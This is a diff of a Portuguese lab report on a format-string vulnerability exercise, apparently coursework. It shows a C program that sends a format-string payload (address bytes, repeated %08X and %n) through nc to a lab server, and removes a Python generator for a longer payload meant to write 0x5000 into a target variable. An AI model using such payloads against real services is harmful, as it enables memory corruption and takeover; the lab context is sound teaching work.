@@ -97,7 +97,7 @@ O código executado foi o seguinte:
 #include <stdlib.h>
 
 int main() {
-    char cmd[296] = "echo \x08\x0e\x50\x68%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %n | nc 10.9.0.5 9090";
+    char cmd[296] = "echo \x68\x50\x0e\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %n | nc 10.9.0.5 9090";
     
     system(cmd);
     return 0;
@@ -106,23 +106,14 @@ int main() {
 
 O output do lado do servidor foi o seguinte:
 
-#TODO -> print ou texto
+![Task 3 A](../img/lab6task3a.png)
 
 ### Task 3.B
 
-Desta vez o valor de `target` deve ser mudado para um valor concreto: 0x5000, ou seja 20480 em decimal. Como sabemos que '%n' irá escrever o número de caracteres escritos até ali, então o input até '%n' terá de ter 20408 caracteres.
+Desta vez o valor de `target` deve ser mudado para um valor concreto: 0x5000, ou seja 20480 em decimal. Como sabemos que '%n' irá escrever o número de caracteres escritos até ali, então o input até '%n' terá de ter 20408 caracteres. Como o input é grande, usamos a notação `%.Nx`, com N = 20408 - 4 - 63.
 
-Para simplificar a tarefa, usamos um programa em Python para criar o input:
-
-```python
-# '\x08\x0e\x50\x68' > 4 caracteres
-# '%08x'             > 1 caracter
-# a string restante terá 20408 - 4 - 63 = 20341 caracteres
-print("\x08\x0e\x50\x68" + "F" * 20341 + "%08x" * 63 + "%n")
-```
-
-```bash
-$ python3 make_input.py | nc 10.9.0.5 9090
+```c
+#TODO
 ```
 
 Originou o seguinte output no servidor:
